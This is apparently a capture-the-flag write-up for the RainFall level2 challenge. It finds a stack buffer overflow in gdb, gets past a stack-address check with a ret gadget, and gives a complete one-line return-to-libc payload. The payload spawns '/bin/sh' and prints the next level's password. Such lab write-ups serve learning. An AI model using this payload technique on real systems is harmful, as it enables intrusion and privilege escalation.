As usual, we tried to find the sweet spot to change the stack with our buffer overflow.
At some point, there was a strange thing : 

>Starting program: /home/user/level2/level2 
>AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS
>AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPJRRRRSSSS
>Program received signal SIGSEGV, Segmentation fault.
>0x4b4b4b4b in ?? ()

It was pointing inside our buffer (the KKKK) but we couldn't make any of our shellcode work. So we tried to go further

>AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUU
>AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTTUUUU
>Program received signal SIGSEGV, Segmentation fault.
>0x55555555 in ?? ()

Now, we are good. There is one more thing to handle : 

``` c
  if ((local_res0 & 0xb0000000) == 0xb0000000) {
```

We needed to provide an address that doesn't start by `0xb` id-est, in our case, that is not in the stack. To do so, we use a feature of asm :
The `ret` command, in fact, hide `pop eip` followed by `jmp`. So, we provide the address of a `ret` (here the one in main, obtained by `disas main` in gdb) followed by a call to `sytem("/bin/sh")`. This way, we overwrite `eip` that was supposed to be stored after the `ret` and we call `system`

>level2@RainFall:~$ cat <(python -c 'print "A" * 80  + "\x4b\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "IDGB" + "\x58\xcc\xf8\xb7"') - | ./level2
>AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPKRRRRSSSSTTTTK`��IDGBX���
>whoami
>level3
>cat /home/user/level3/.pass
>492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

```bash
su level3
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

